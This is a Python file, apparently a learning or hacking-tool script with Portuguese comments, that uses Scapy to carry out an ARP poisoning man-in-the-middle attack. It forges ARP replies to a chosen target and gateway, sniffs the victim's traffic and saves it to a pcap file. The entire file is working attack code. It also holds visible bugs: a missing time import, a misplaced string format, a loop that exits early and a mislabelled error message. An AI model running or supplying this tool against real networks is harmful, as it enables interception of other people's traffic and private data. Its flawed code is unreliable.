from scapy.all import *
import os
import sys
import threading
import signal

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):     #Restaura o ARP Cache do alvo e do gateway
    print ('[*] Restoring target...')
    send(ARP(op = 2, psrc = gateway_ip, pdst = target_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateway_mac), count = 5)     #Envia pacotes ARP para o alvo
    send(ARP(op = 2, psrc = target_ip, pdst = gateway_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = target_mac), count = 5)      #Envia pacotes ARP para o gateway

    print('[*] Killing the process')
    os.kill(os.getpid(), signal.SIGINT)     #Mata o processo de envio e captura de pacotes

def get_mac(ip_address):        #Descobre o MAC do IP escopo
    responses, unanswered = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = ip_address), timeout = 2, retry = 10)     #Envia solicitações em busca de respostas
    for s, r in responses:
        return r[Ether].src     #r[Ether].src possui os endereços MAC que responderam as solicitações
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()       #Define um objeto ARP para envenenar o ARP cache do alvo
    poison_target.op = 2        
    poison_target.psrc = gateway_ip     #Define o IP do gateway como fonte
    poison_target.pdst = target_ip      #Define o IP do alvo como destino
    poison_target.hwdst = target_mac    #Define o MAC que será inserido no ARP cache do alvo

    poison_gateway = ARP()      #Define um objeto ARP para envenenar o ARP cache do gateway
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip     #Define o IP do alvo como fonte
    poison_gateway.pdst = gateway_ip        #Define o IP do gateway como destino
    poison_gateway.hwdst = gateway_mac      #Define o MAC que será inserido no ARP cache do gateway

    print ('[*] Beginning the ARP poison. [CTRL-C to stop]')
    while True:
        try:
            send(poison_target)     #Realiza o spoofing no alvo
            send(poison_gateway)     #Realiza o spoofing no gateway
            time.sleep(2)
        
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print ('[*] ARP poison attack finished.')
        return

def main():
    print(' _     _         _                                 ____             ')
    print('(_)   (_)  ____ (_)_  _____                       (____) ____  _    ')
    print('(__)_ (_) (____)(___)(_____) ____    ___    ___  (_)__  (____)(_)__ ')
    print('(_)(_)(_)(_)_(_)(_)    _(_) (____)  (___)  (___) (____)(_)_(_)(____)')
    print('(_)  (__)(__)__ (_)_  (_)__ (_)_(_)(_)_(_)(_)_(_)(_)   (__)__ (_)   ')
    print('(_)   (_) (____) (__)(_____)(____)  (___)  (___) (_)    (____)(_)   ')
    print('                            (_)                                     ')
    print('                            (_)                                     ')

    interface = input('Network Interface: ')        #Seta a interface de rede do usuário
    target_ip = input('Target IP: ')        #Seta o IP da máquina alvo
    gateway_ip = input('Gateway IP: ')      #Seta o IP do gateway
    packet_count = int(input('Packet Limit: '))     #Seta a quantidade de pacotes interceptados
    output_filename = input('Output Filename: ')        #Seta o nome do arquivo final

    conf.iface = interface      #Configura a interface de rede para o sniffing
    conf.verb = 0
    print ('[*] Setting up %s' %interface)
    gateway_mac = get_mac(gateway_ip)       #Busca o MAC do gateway

    if gateway_mac is None:     #Caso falhe em pegar o MAC do gateway
        print ('[!!!] Failed to get gateway MAC. Exiting.')
        sys.exit(0)
    else:
        print ('[*] Gateway %s is at %s') % (gateway_ip, gateway_mac)       #Caso o MAC seja adquirido com sucesso

    target_mac = get_mac(target_ip)     #Busca o MAC do alvo

    if target_mac is None:      #Caso falhe em pegar o MAC do alvo
        print ('[!!!] Failed to get gateway MAC. Exiting.')
        sys.exit(0)
    else:
        print ('[*] Target %s is at %s' % (target_ip, target_mac))      #Caso o MAC seja adquirido com sucesso

    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))       #Instância de thread para o spoofing
    poison_thread.start()       #Inicia a thread

    try:        #Tenta iniciar o sniffing
        print ('[*] Starting sniffer for %d packets' % packet_count)
        bpf_filter = 'ip host %s' %target_ip        #Filtro de IP, fará com que apenas os pacotes endereçados ao alvo estejam no arquivo final
        packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)       #Inicia a captura de tráfego
        wrpcap(output_filename, packets)        #Escreve o tráfego capturado no arquivo final
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)      #Chama a função para restaurar o ARP cache dos envolvidos

    except KeyboardInterrupt:       #Caso o sniffing falhe
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)      #Chama a função para restaurar o ARP cache dos envolvidos
        sys.exit(0)

main()